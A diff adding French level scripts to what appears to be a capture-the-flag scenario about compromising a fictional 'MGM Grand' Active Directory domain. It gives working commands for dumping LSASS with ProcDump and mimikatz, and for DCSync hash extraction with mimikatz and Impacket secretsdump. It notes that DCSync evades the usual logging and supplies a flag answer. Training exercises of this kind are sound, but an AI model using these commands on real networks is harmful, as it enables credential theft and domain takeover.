@@ -361,14 +361,116 @@ Write-Host "Utilisateur $username créé et ajouté au groupe Administrators."
 Level 6 (AD MGM grand) : Dump mémoire LSAAS
 
 
+Script pour histoire du niveau :
+
+Après avoir créé le compte admin, l’équipe d’Ocean se trouve en position idéale pour s’attaquer à un objectif encore plus précieux : les secrets en mémoire vive du système stockés dans le processus LSASS.
+
+
+Votre mission pour ce niveau consiste donc à utiliser votre compte admin pour dumper la mémoire, puis extraire de ce dump tous les identifiants utiles (hashes NTLM, tickets Kerberos).
+
+Attaque : 
+
+scp ProcDump.exe mimikatz.exe ocean-admin@MGM-SRV:C:\temp\
+
+Enter-PSSession -ComputerName MGM-SRV -Credential MGM\ocean-admin
+
+cd C:\temp
+
+.\ProcDump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
+
+Exit-PSSession
+
+scp ocean-admin@MGM-SRV:C:\temp\lsass.dmp /path/to/local/
+
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
+
+
+
+
+
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
 Level 7:  DCSYNC 
+
+Script pour histoire du niveau :
+
+Vous avez désormais les privilèges de Domain Admin sur le domaine MGM Grand. Avec ce niveau d’accès, vous êtes à deux doigts de contrôler totalement l’infrastructure Active Directory. Cependant, pour finaliser votre emprise, il vous faut centraliser tous les secrets du domaine : mots de passe de chaque utilisateur, comptes de services, et le hash du compte krbtg...
+
+Votre mission pour ce niveau consiste à simuler un contrôleur de domaine afin d’interroger directement l’AD. En exécutant DCSYNC depuis une machine compromise, vous ne déclencherez pas les journaux classiques d’un dump direct de la base AD, car c’est l’API Domain Replication (RPC) qui vous fournira copie des attributs sensibles (ntHash, LMHash, etc.) en tant que « réplicateur ».
+
+Attaque : 
+
+Grâce à l’étape précédente, vous possédez le hash NTLM (ou le ticket Kerberos) du compte Administrator@MGM. Assurez-vous d’avoir un shell administratif sur une machine du domaine (par exemple via wmiexec.py ou pth-winexe), ou d’être connecté directement sur le contrôleur de domaine.
+
+Choisir l’outil pour DCSYNC
+Deux méthodes courantes :
+
+Mimikatz (sekurlsa::dcsync)
+
+Impacket (secretsdump.py – –dc-sync)
+
+DCSYNC avec Mimikatz
+
+Ouvrez une session sur une machine Windows où Mimikatz est disponible, avec un compte Domain Admin (ici, MGM\Administrator ou équivalent).
+
+Lancez Mimikatz en mode élevé (PowerShell ou CMD « Exécuter en tant qu’administrateur »), puis exécutez :
+
+mimikatz.exe
+privilege::debug
+lsadump::dcsync /domain:mgm.local /all /csv /output:C:\temp\hashes_dcsync.csv
+exit
+lsadump::dcsync /domain:mgm.local /all extrait tout le set d’attributs réplicables pour tous les comptes (y compris le hash NTLM et le LMHash).
+
+Le paramètre /csv /output:… enregistre les données dans un fichier CSV (C:\temp\hashes_dcsync.csv).
+
+DCSYNC avec Impacket (secretsdump.py)
+
+Sur votre machine pentest (Linux/macOS), exécutez :
+
+secretsdump.py MGM/Administrator@"MGM-DC.mgm.local" -just-dc-user krbtgt -outputfile mgm_hashes
+Cette commande cible spécifiquement le compte krbtgt, mais vous pouvez omettre -just-dc-user krbtgt pour récupérer tous les comptes :
+
+
+secretsdump.py MGM/Administrator@"MGM-DC.mgm.local" -outputfile mgm_hashes
+Le fichier mgm_hashes.ntds contiendra les hash NTLM de chaque compte, incluant celui de krbtgt.
+
+Vérifier et extraire le hash du compte krbtgt
+
+Ouvrez le fichier CSV (avec Excel, un éditeur de texte ou un script) et repérez la ligne dont UserName = krbtgt.
+
+Notez la colonne NTLMHash (et AAD_SHA si vous prévoyez un Silver Ticket).
+
+Exemple de sortie tirée de Mimikatz :
+
+
+"MGM\krbtgt","AAD_SHA: …","NTLM: be0c07d7a82f4e1a9b7c3a5a6f7b8c9d",…
+
+Ici, le NTLM: be0c07d7a82f4e1a9b7c3a5a6f7b8c9d est la valeur qui intéresse.
+
+Centraliser tous les hashes
+
+Conservez l’ensemble des hashes NTLM dans un fichier sécurisé (mgm_all_hashes.txt) pour un usage ultérieur.
+
+Vous pourrez ensuite craquer les mots de passe si nécessaire, ou directement utiliser les hash pour passer le hash sur d’autres services du domaine.
+
+Valider la réussite du niveau 7
+
+Flag implicite : l’obtention du hash NTLM du compte krbtgt du domaine mgm.local.
+
+Documentez la valeur exacte (par exemple : krbtgt NTLM = be0c07d7a82f4e1a9b7c3a5a6f7b8c9d) et soumettez-la pour valider ce niveau.
+
+Dans certains environnements CTF, on vous demandera explicitement :
+
+Flag à soumettre : be0c07d7a82f4e1a9b7c3a5a6f7b8c9d
+
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Level 8: Fabrication ticket Kerberos 
+
+
+
 
 
 
